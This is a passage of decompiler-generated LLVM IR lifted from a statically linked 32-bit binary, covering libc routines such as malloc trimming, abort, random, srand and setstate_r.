  %v0_804a92a = load i32, i32* @edi, align 4
  store i32 %v0_804a92a, i32* @global_var_805583c.36, align 4
  br label %dec_label_pc_804a930

dec_label_pc_804a930:                             ; preds = %dec_label_pc_804a8fb, %dec_label_pc_804a920
  %v0_804a930 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_804a930, 131072
  br i1 %tmp21, label %dec_label_pc_804a98d, label %dec_label_pc_804a938

dec_label_pc_804a938:                             ; preds = %dec_label_pc_804a930
  %v0_804a938 = load i8, i8* @global_var_8055810.34, align 16
  %v1_804a938 = and i8 %v0_804a938, 2
  %v2_804a938 = icmp eq i8 %v1_804a938, 0
  br i1 %v2_804a938, label %dec_label_pc_804a94c, label %dec_label_pc_804a941

dec_label_pc_804a941:                             ; preds = %dec_label_pc_804a938
  %v2_804a946 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8055810.34 to i32*))
  store i32 ptrtoint (i8* @global_var_8055810.34 to i32), i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a94c

dec_label_pc_804a94c:                             ; preds = %dec_label_pc_804a938, %dec_label_pc_804a941
  %v0_804a94c = load i32, i32* @global_var_805583c.36, align 4
  store i32 %v0_804a94c, i32* %eax.global-to-local, align 4
  %v1_804a951 = add i32 %v0_804a94c, 4
  %v2_804a951 = inttoptr i32 %v1_804a951 to i32*
  %v3_804a951 = load i32, i32* %v2_804a951, align 4
  %v1_804a954 = and i32 %v3_804a951, -4
  store i32 %v1_804a954, i32* %eax.global-to-local, align 4
  %v1_804a957 = load i32, i32* @global_var_8055b54.53, align 4
  %v7_804a957 = icmp ult i32 %v1_804a954, %v1_804a957
  br i1 %v7_804a957, label %dec_label_pc_804a98d, label %dec_label_pc_804a95f

dec_label_pc_804a95f:                             ; preds = %dec_label_pc_804a94c
  store i32 ptrtoint (i8* @global_var_8055810.34 to i32), i32* @edx, align 4
  %v0_804a964 = load i32, i32* @global_var_8055b58.51, align 8
  store i32 %v0_804a964, i32* @eax, align 4
  %v0_804a969 = call i32 @__malloc_trim()
  store i32 %v0_804a969, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a98d

dec_label_pc_804a970:                             ; preds = %dec_label_pc_804a881
  %v2_804a970 = inttoptr i32 %v1_804a845 to i32*
  %v3_804a970 = load i32, i32* %v2_804a970, align 4
  store i32 %v3_804a970, i32* %edx.global-to-local, align 4
  %v0_804a973 = load i32, i32* @global_var_8055b60.44, align 32
  %v1_804a973 = add i32 %v0_804a973, -1
  store i32 %v1_804a973, i32* @global_var_8055b60.44, align 32
  %v2_804a979 = add i32 %v3_804a970, %v1_804a84f
  store i32 %v2_804a979, i32* %eax.global-to-local, align 4
  %v0_804a97c = load i32, i32* @global_var_8055b74.47, align 4
  %v2_804a97c = sub i32 %v0_804a97c, %v2_804a979
  store i32 %v2_804a97c, i32* @global_var_8055b74.47, align 4
  %v2_804a983 = sub i32 %v1_804a845, %v3_804a970
  store i32 %v2_804a983, i32* %ecx.global-to-local, align 4
  %v2_804a986 = call i32 @munmap(i32 %v2_804a983, i32 %v2_804a979)
  store i32 %v2_804a986, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a98d

dec_label_pc_804a98d:                             ; preds = %dec_label_pc_804a94c, %dec_label_pc_804a930, %dec_label_pc_804a95f, %dec_label_pc_804a85e, %dec_label_pc_804a970
  store i32 %v2_804a831, i32* %eax.global-to-local, align 4
  %v3_804a994 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_804a994, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a99b

dec_label_pc_804a99b:                             ; preds = %entry, %dec_label_pc_804a98d
  %.0 = phi i32 [ undef, %entry ], [ %v3_804a994, %dec_label_pc_804a98d ]
  store i32 %v0_804a817, i32* @ebx, align 4
  store i32 %v0_804a816, i32* @esi, align 4
  store i32 %v0_804a815, i32* @edi, align 4
  store i32 %v0_804a814, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804a970, { 1, 0, 2 }
  uselistorder i32 %v0_804a91b, { 1, 0 }
  uselistorder i32 %v1_804a8d4, { 1, 0 }
  uselistorder i32 %v2_804a8d0, { 1, 0 }
  uselistorder i32 %v1_804a8c5, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804a8d7, { 1, 0 }
  uselistorder i32 %v2_804a868, { 1, 0 }
  uselistorder i32 %v3_804a84a, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804a845, { 1, 4, 2, 3, 0, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 25, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8055810.34 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8055844.40 to i32), { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_804a99b, { 1, 0 }
  uselistorder label %dec_label_pc_804a98d, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804a94c, { 1, 0 }
  uselistorder label %dec_label_pc_804a930, { 1, 0 }
  uselistorder label %dec_label_pc_804a8fb, { 1, 0 }
  uselistorder label %dec_label_pc_804a8f3, { 1, 0 }
  uselistorder label %dec_label_pc_804a8c2, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804a9a3 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804a9ad = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8055810.34 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8055810.34 to i32), i32* @edx, align 4
  %v0_804a9b8 = load i32, i32* @ebx, align 4
  store i32 %v0_804a9b8, i32* @eax, align 4
  store i32 %v0_804a9a3, i32* @ebx, align 4
  %v0_804a9bb = call i32 @__malloc_trim()
  ret i32 %v0_804a9bb

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8055810.34 to i32), { 5, 4, 0, 3, 2, 1 }
  uselistorder i8* @global_var_8055810.34, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_804a9c9 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805335c.55 to i32))
  store i32 32, i32* %stack_var_-12, align 4
  %v2_804a9e0 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_804a9e0, i32* %eax.global-to-local, align 4
  %v3_804a9e7 = bitcast i32* %stack_var_-12 to %_TYPEDEF_sigset_t*
  %v4_804a9e7 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_804a9e7, i32 0)
  store i32 %v4_804a9e7, i32* %eax.global-to-local, align 4
  %v0_804a9ef = load i8, i8* @global_var_80537a4.56, align 4
  %v1_804a9ef = icmp eq i8 %v0_804a9ef, 0
  %v1_804a9f6 = icmp eq i1 %v1_804a9ef, false
  br i1 %v1_804a9f6, label %dec_label_pc_804aa1d, label %dec_label_pc_804a9f8

dec_label_pc_804a9f8:                             ; preds = %entry
  store i8 1, i8* @global_var_80537a4.56, align 4
  br label %dec_label_pc_804a9ff

dec_label_pc_804a9ff:                             ; preds = %dec_label_pc_804aa26, %dec_label_pc_804a9f8
  %v1_804aa04 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805335c.55 to i32))
  store i32 %v1_804aa04, i32* %eax.global-to-local, align 4
  %v1_804aa0b = call i32 @__GI_raise(i32 6)
  store i32 %v1_804aa0b, i32* %eax.global-to-local, align 4
  %v1_804aa15 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805335c.55 to i32))
  store i32 %v1_804aa15, i32* %eax.global-to-local, align 4
  %v0_804aa1d.pre = load i8, i8* @global_var_80537a4.56, align 4
  br label %dec_label_pc_804aa1d

dec_label_pc_804aa1d:                             ; preds = %entry, %dec_label_pc_804a9ff
  %v2_804aa1d = phi i32 [ %v4_804a9e7, %entry ], [ %v1_804aa15, %dec_label_pc_804a9ff ]
  %v0_804aa1d = phi i8 [ %v0_804a9ef, %entry ], [ %v0_804aa1d.pre, %dec_label_pc_804a9ff ]
  %v1_804aa1d = zext i8 %v0_804aa1d to i32
  %v3_804aa1d = and i32 %v2_804aa1d, -256
  %v4_804aa1d = or i32 %v1_804aa1d, %v3_804aa1d
  store i32 %v4_804aa1d, i32* %eax.global-to-local, align 4
  %v10_804aa22 = icmp eq i8 %v0_804aa1d, 1
  %v1_804aa24 = icmp eq i1 %v10_804aa22, false
  br i1 %v1_804aa24, label %dec_label_pc_804aa59, label %dec_label_pc_804aa26

dec_label_pc_804aa26:                             ; preds = %dec_label_pc_804aa1d
  store i8 2, i8* @global_var_80537a4.56, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804aa2f = ptrtoint i32* %stack_var_-32 to i32
  store i32 0, i32* %stack_var_-32, align 4
  %v4_804aa35 = load i1, i1* @df, align 1
  %v5_804aa35 = select i1 %v4_804aa35, i32 -4, i32 4
  %v6_804aa35 = add i32 %v5_804aa35, %v2_804aa2f
  store i32 %v6_804aa35, i32* %edi.global-to-local, align 4
  %v2_804aa36 = inttoptr i32 %v6_804aa35 to i32*
  store i32 0, i32* %v2_804aa36, align 4
  %v3_804aa36 = load i32, i32* %edi.global-to-local, align 4
  %v6_804aa36 = add i32 %v3_804aa36, %v5_804aa35
  store i32 %v6_804aa36, i32* %edi.global-to-local, align 4
  %v0_804aa37 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa37 = inttoptr i32 %v6_804aa36 to i32*
  store i32 %v0_804aa37, i32* %v2_804aa37, align 4
  %v3_804aa37 = load i32, i32* %edi.global-to-local, align 4
  %v6_804aa37 = add i32 %v3_804aa37, %v5_804aa35
  store i32 %v6_804aa37, i32* %edi.global-to-local, align 4
  %v0_804aa38 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa38 = inttoptr i32 %v6_804aa37 to i32*
  store i32 %v0_804aa38, i32* %v2_804aa38, align 4
  %v3_804aa38 = load i32, i32* %edi.global-to-local, align 4
  %v6_804aa38 = add i32 %v3_804aa38, %v5_804aa35
  store i32 %v6_804aa38, i32* %edi.global-to-local, align 4
  %v0_804aa39 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa39 = inttoptr i32 %v6_804aa38 to i32*
  store i32 %v0_804aa39, i32* %v2_804aa39, align 4
  %v4_804aa4f = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-32, i32 0)
  store i32 %v4_804aa4f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a9ff

dec_label_pc_804aa59:                             ; preds = %dec_label_pc_804aa1d
  %v10_804aa59 = icmp eq i8 %v0_804aa1d, 2
  %v1_804aa5b = icmp eq i1 %v10_804aa59, false
  br i1 %v1_804aa5b, label %dec_label_pc_804aa65, label %dec_label_pc_804aa65.thread

dec_label_pc_804aa65.thread:                      ; preds = %dec_label_pc_804aa59
  store i8 3, i8* @global_var_80537a4.56, align 4
  br label %dec_label_pc_804aa6e

dec_label_pc_804aa65:                             ; preds = %dec_label_pc_804aa59
  %v9_804aa65 = icmp eq i8 %v0_804aa1d, 3
  %v1_804aa6c = icmp eq i1 %v9_804aa65, false
  br i1 %v1_804aa6c, label %dec_label_pc_804aa7c, label %dec_label_pc_804aa6e

dec_label_pc_804aa6e:                             ; preds = %dec_label_pc_804aa65.thread, %dec_label_pc_804aa65
  store i8 4, i8* @global_var_80537a4.56, align 4
  %v1_804aa77 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_804aa7c:                             ; preds = %dec_label_pc_804aa65, %dec_label_pc_804aa7c
  br label %dec_label_pc_804aa7c

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 0 }
  uselistorder i8* @global_var_80537a4.56, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804aa7c, { 1, 0 }
  uselistorder label %dec_label_pc_804aa6e, { 1, 0 }
  uselistorder label %dec_label_pc_804aa1d, { 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v15_804aa81 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v15_804aa81, i32* @ebx, align 4
  %v4_804aa93 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134525440, i32 ptrtoint (i32* @global_var_8053374.57 to i32))
  %v1_804aa9d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053374.57 to i32))
  %v2_804aaa2 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804aaac = call i32 @__GI_random_r(i32* nonnull @global_var_805338c, i32 %v2_804aaa2)
  %v3_804aab4 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v3_804aab9 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_804aab9
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v4_804aad6 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134525440, i32 ptrtoint (i32* @global_var_8053374.57 to i32))
  %v1_804aae0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053374.57 to i32))
  %v3_804aaf4 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805338c)
  %v2_804aafe = icmp slt i32 %v3_804aaf4, 0
  br i1 %v2_804aafe, label %dec_label_pc_804ab05, label %dec_label_pc_804ab02

dec_label_pc_804ab02:                             ; preds = %entry
  br label %dec_label_pc_804ab05

dec_label_pc_804ab05:                             ; preds = %entry, %dec_label_pc_804ab02
  %storemerge = phi i32 [ ptrtoint (i32** @global_var_8053390.61 to i32), %dec_label_pc_804ab02 ], [ 0, %entry ]
  %v3_804ab0c = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_804ab05, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v12_804ab1b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v12_804ab1b, i32* @ebx, align 4
  %v4_804ab2d = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134525440, i32 ptrtoint (i32* @global_var_8053374.57 to i32))
  %v1_804ab37 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053374.57 to i32))
  store i32 ptrtoint (i32** @global_var_8053390.61 to i32), i32* @esi, align 4
  %v4_804ab56 = inttoptr i32 %arg2 to i32*
  %v5_804ab56 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_804ab56, i32 %arg3, i32 ptrtoint (i32* @global_var_805338c to i32))
  %v3_804ab61 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_804ab66 = load i32, i32* @esi, align 4
  ret i32 %v0_804ab66

; uselistorder directives
  uselistorder i32 ptrtoint (i32** @global_var_8053390.61 to i32), { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v0_804ab6e = load i32, i32* @ebx, align 4
  %v12_804ab6f = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v12_804ab6f, i32* @ebx, align 4
  %v4_804ab81 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134525440, i32 ptrtoint (i32* @global_var_8053374.57 to i32))
  %v1_804ab8b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053374.57 to i32))
  %v2_804ab99 = sext i32 %arg1 to i64
  %v3_804ab99 = call i32 @srandom_r(i64 %v2_804ab99, i32 ptrtoint (i32* @global_var_805338c to i32))
  %v3_804aba1 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  store i32 %v0_804ab6e, i32* @ebx, align 4
  ret i32 %v3_804aba1

; uselistorder directives
  uselistorder i32* @global_var_805338c, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805338c to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8053374.57 to i32), { 4, 0, 5, 1, 6, 2, 7, 3 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i64 @__decompiler_undefined_function_3()
  %tmp8 = ptrtoint i32* %arg2 to i32
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v1_804abbb = add i32 %arg1, 4
  store i32 %v1_804abbb, i32* %esi.global-to-local, align 4
  %v1_804abbe = add i32 %tmp8, 12
  %v2_804abbe = inttoptr i32 %v1_804abbe to i8*
  %v3_804abbe = load i8, i8* %v2_804abbe, align 1
  %v1_804abc1 = add i32 %tmp8, 8
  %v2_804abc1 = inttoptr i32 %v1_804abc1 to i32*
  %v3_804abc1 = load i32, i32* %v2_804abc1, align 4
  store i32 %v3_804abc1, i32* %ecx.global-to-local, align 4
  %v4_804abc4 = icmp eq i8 %v3_804abbe, 0
  %v1_804abc6 = icmp eq i1 %v4_804abc4, false
  br i1 %v1_804abc6, label %dec_label_pc_804abd1, label %dec_label_pc_804abc8

dec_label_pc_804abc8:                             ; preds = %entry
  %v1_804abc8 = add i32 %v3_804abc1, -4
  %v2_804abc8 = inttoptr i32 %v1_804abc8 to i32*
  store i32 0, i32* %v2_804abc8, align 4
  br label %dec_label_pc_804abe4

dec_label_pc_804abd1:                             ; preds = %entry
  %v1_804abd1 = add i32 %tmp8, 4
  %v2_804abd1 = inttoptr i32 %v1_804abd1 to i32*
  %v3_804abd1 = load i32, i32* %v2_804abd1, align 4
  %v2_804abd4 = sub i32 %v3_804abd1, %v3_804abc1
  %v2_804abd6 = sdiv i32 %v2_804abd4, 4
  %v3_804abd9 = mul i32 %v2_804abd6, 5
  %v2_804abdc = sext i8 %v3_804abbe to i32
  %v2_804abdf = add i32 %v3_804abd9, %v2_804abdc
  store i32 %v2_804abdf, i32* %eax.global-to-local, align 4
  %v2_804abe1 = add i32 %v3_804abc1, -4
  %v3_804abe1 = inttoptr i32 %v2_804abe1 to i32*
  store i32 %v2_804abdf, i32* %v3_804abe1, align 4
  br label %dec_label_pc_804abe4

dec_label_pc_804abe4:                             ; preds = %dec_label_pc_804abc8, %dec_label_pc_804abd1
  %v0_804abe4 = load i32, i32* %esi.global-to-local, align 4
  %v1_804abe4 = add i32 %v0_804abe4, -4
  %v2_804abe4 = inttoptr i32 %v1_804abe4 to i32*
  %v3_804abe4 = load i32, i32* %v2_804abe4, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804abec = ashr i32 %v3_804abe4, 31
  %v2_804abed = zext i32 %v3_804abe4 to i64
  %v4_804abed = zext i32 %v1_804abec to i64
  %v5_804abed = mul nuw i64 %v4_804abed, 4294967296
  %v6_804abed = or i64 %v5_804abed, %v2_804abed
  %v8_804abed = sdiv i64 %v6_804abed, 5
  %v9_804abed = trunc i64 %v8_804abed to i32
  store i32 %v9_804abed, i32* %eax.global-to-local, align 4
  %v10_804abed = srem i64 %v6_804abed, 5
  %v12_804abed = trunc i64 %v10_804abed to i8
  %v1_804abef = sext i8 %v12_804abed to i32
  %v7_804abf2 = icmp ugt i8 %v12_804abed, 4
  br i1 %v7_804abf2, label %dec_label_pc_804ac40, label %dec_label_pc_804abf4

dec_label_pc_804abf4:                             ; preds = %dec_label_pc_804abe4
  %v2_804abf4 = add i32 %v1_804abef, ptrtoint (i8** @global_var_8050e65.62 to i32)
  %v3_804abf4 = inttoptr i32 %v2_804abf4 to i8*
  %v4_804abf4 = load i8, i8* %v3_804abf4, align 1
  %v5_804abf4 = zext i8 %v4_804abf4 to i32
  %v7_804abf4 = and i32 %v9_804abed, -256
  %v8_804abf4 = or i32 %v5_804abf4, %v7_804abf4
  store i32 %v8_804abf4, i32* %eax.global-to-local, align 4
  %v2_804abfa = sext i8 %v4_804abf4 to i32
  store i32 %v2_804abfa, i32* %ecx.global-to-local, align 4
  %v2_804abfd = load i32, i32* %ebx.global-to-local, align 4
  %v3_804abfd = add i32 %v2_804abfd, 13
  %v4_804abfd = inttoptr i32 %v3_804abfd to i8*
  store i8 %v4_804abf4, i8* %v4_804abfd, align 1
  %v2_804ac00 = add i32 %v1_804abef, ptrtoint (i8** @global_var_8050e60.63 to i32)
  %v3_804ac00 = inttoptr i32 %v2_804ac00 to i8*
  %v4_804ac00 = load i8, i8* %v3_804ac00, align 1
  %v5_804ac00 = zext i8 %v4_804ac00 to i32
  %v6_804ac00 = load i32, i32* %eax.global-to-local, align 4
  %v7_804ac00 = and i32 %v6_804ac00, -256
  %v8_804ac00 = or i32 %v7_804ac00, %v5_804ac00
  store i32 %v8_804ac00, i32* %eax.global-to-local, align 4
  %v2_804ac0a = load i32, i32* %ebx.global-to-local, align 4
  %v3_804ac0a = add i32 %v2_804ac0a, 14
  %v4_804ac0a = inttoptr i32 %v3_804ac0a to i8*
  store i8 %v4_804ac00, i8* %v4_804ac0a, align 1
  %v3_804ac0d = load i32, i32* %ebx.global-to-local, align 4
  %v4_804ac0d = add i32 %v3_804ac0d, 12
  %v5_804ac0d = inttoptr i32 %v4_804ac0d to i8*
  store i8 %v12_804abed, i8* %v5_804ac0d, align 1
  %v2_804ac10 = icmp eq i8 %v12_804abed, 0
  br i1 %v2_804ac10, label %dec_label_pc_804ac33, label %dec_label_pc_804ac14

dec_label_pc_804ac14:                             ; preds = %dec_label_pc_804abf4
  %v0_804ac14 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ac14 = add i32 %v0_804ac14, -4
  %v2_804ac14 = inttoptr i32 %v1_804ac14 to i32*
  %v3_804ac14 = load i32, i32* %v2_804ac14, align 4
  %v1_804ac19 = ashr i32 %v3_804ac14, 31
  %v0_804ac1a = load i32, i32* %edi.global-to-local, align 4
  %v2_804ac1a = zext i32 %v3_804ac14 to i64
  %v4_804ac1a = zext i32 %v1_804ac19 to i64
  %v5_804ac1a = mul nuw i64 %v4_804ac1a, 4294967296
  %v6_804ac1a = or i64 %v5_804ac1a, %v2_804ac1a
  %v7_804ac1a = zext i32 %v0_804ac1a to i64
  %v8_804ac1a = sdiv i64 %v6_804ac1a, %v7_804ac1a
  %v9_804ac1a = trunc i64 %v8_804ac1a to i32
  store i32 %v9_804ac1a, i32* %edi.global-to-local, align 4
  %v2_804ac1e = mul i32 %v9_804ac1a, 4
  %v3_804ac1e = add i32 %v2_804ac1e, %v0_804ac14
  %v1_804ac21 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ac21 = add i32 %v1_804ac21, 4
  %v3_804ac21 = inttoptr i32 %v2_804ac21 to i32*
  store i32 %v3_804ac1e, i32* %v3_804ac21, align 4
  %v5_804ac24 = sext i8 %v4_804ac00 to i32
  %v1_804ac29 = load i32, i32* %edi.global-to-local, align 4
  %v2_804ac29 = add i32 %v1_804ac29, %v5_804ac24
  %v1_804ac2b = ashr i32 %v2_804ac29, 31
  %v0_804ac2c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ac2c = zext i32 %v2_804ac29 to i64
  %v4_804ac2c = zext i32 %v1_804ac2b to i64
  %v5_804ac2c = mul nuw i64 %v4_804ac2c, 4294967296
  %v6_804ac2c = or i64 %v5_804ac2c, %v2_804ac2c
  %v7_804ac2c = zext i32 %v0_804ac2c to i64
  %v8_804ac2c = sdiv i64 %v6_804ac2c, %v7_804ac2c
  %v9_804ac2c = trunc i64 %v8_804ac2c to i32
  store i32 %v9_804ac2c, i32* %eax.global-to-local, align 4
  %v10_804ac2c = srem i64 %v6_804ac2c, %v7_804ac2c
  %v11_804ac2c = trunc i64 %v10_804ac2c to i32
  %v0_804ac2e = load i32, i32* %esi.global-to-local, align 4
  %v2_804ac2e = mul i32 %v11_804ac2c, 4
  %v3_804ac2e = add i32 %v2_804ac2e, %v0_804ac2e
  %v1_804ac31 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ac31 = inttoptr i32 %v1_804ac31 to i32*
  store i32 %v3_804ac2e, i32* %v2_804ac31, align 4
  br label %dec_label_pc_804ac33

dec_label_pc_804ac33:                             ; preds = %dec_label_pc_804abf4, %dec_label_pc_804ac14
  %v0_804ac33 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ac33 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ac33 = add i32 %v1_804ac33, 8
  %v3_804ac33 = inttoptr i32 %v2_804ac33 to i32*
  store i32 %v0_804ac33, i32* %v3_804ac33, align 4
  %v0_804ac36 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ac36 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ac36 = mul i32 %v1_804ac36, 4
  %v3_804ac36 = add i32 %v2_804ac36, %v0_804ac36
  store i32 %v3_804ac36, i32* %eax.global-to-local, align 4
  %v1_804ac39 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ac39 = add i32 %v1_804ac39, 16
  %v3_804ac39 = inttoptr i32 %v2_804ac39 to i32*
  store i32 %v3_804ac36, i32* %v3_804ac39, align 4
  br label %dec_label_pc_804ac4e

dec_label_pc_804ac40:                             ; preds = %dec_label_pc_804abe4
  %v1_804ac40 = trunc i64 %tmp to i32
  %sext2 = mul i32 %v1_804ac40, 16777216
  %v2_804ac40 = sdiv i32 %sext2, 16777216
  %v3_804ac40 = call i32 @__GI___errno_location(i32 %v2_804ac40)
  store i32 %v3_804ac40, i32* %eax.global-to-local, align 4
  %v1_804ac45 = inttoptr i32 %v3_804ac40 to i32*
  store i32 22, i32* %v1_804ac45, align 4
  br label %dec_label_pc_804ac4e

dec_label_pc_804ac4e:                             ; preds = %dec_label_pc_804ac33, %dec_label_pc_804ac40
  %storemerge = phi i32 [ -1, %dec_label_pc_804ac40 ], [ 0, %dec_label_pc_804ac33 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v12_804abed, { 2, 1, 0, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %eax.global-to-local, { 2, 8, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_804ac4e, { 1, 0 }
  uselistorder label %dec_label_pc_804ac33, { 1, 0 }
  uselistorder label %dec_label_pc_804abe4, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804ac58 = load i32, i32* @ebx, align 4
  store i32 %v0_804ac58, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804ac61 = add i32 %tmp3, 8
  %v2_804ac61 = inttoptr i32 %v1_804ac61 to i32*
  %v3_804ac61 = load i32, i32* %v2_804ac61, align 4
  store i32 %v3_804ac61, i32* %esi.global-to-local, align 4
  %v1_804ac64 = add i32 %tmp3, 12
  %v2_804ac64 = inttoptr i32 %v1_804ac64 to i8*
  %v3_804ac64 = load i8, i8* %v2_804ac64, align 1
  %v4_804ac64 = icmp eq i8 %v3_804ac64, 0
  %v1_804ac68 = icmp eq i1 %v4_804ac64, false
  br i1 %v1_804ac68, label %dec_label_pc_804ac81, label %dec_label_pc_804ac6a

dec_label_pc_804ac6a:                             ; preds = %entry
  %v2_804ac6a = inttoptr i32 %v3_804ac61 to i32*
  %v3_804ac6a = load i32, i32* %v2_804ac6a, align 4
  %v5_804ac6a = mul i32 %v3_804ac6a, 1103515245
  %v1_804ac70 = add i32 %v5_804ac6a, 12345
  %v1_804ac75 = urem i32 %v1_804ac70, -2147483648
  store i32 %v1_804ac75, i32* %eax.global-to-local, align 4
  store i32 %v1_804ac75, i32* %v2_804ac6a, align 4
  %v0_804ac7c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac7c = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ac7c = inttoptr i32 %v1_804ac7c to i32*
  store i32 %v0_804ac7c, i32* %v2_804ac7c, align 4
  br label %dec_label_pc_804acad

dec_label_pc_804ac81:                             ; preds = %entry
  %v2_804ac81 = load i32, i32* %arg1, align 4
  store i32 %v2_804ac81, i32* %eax.global-to-local, align 4
  %v1_804ac83 = add i32 %tmp3, 4
  %v2_804ac83 = inttoptr i32 %v1_804ac83 to i32*
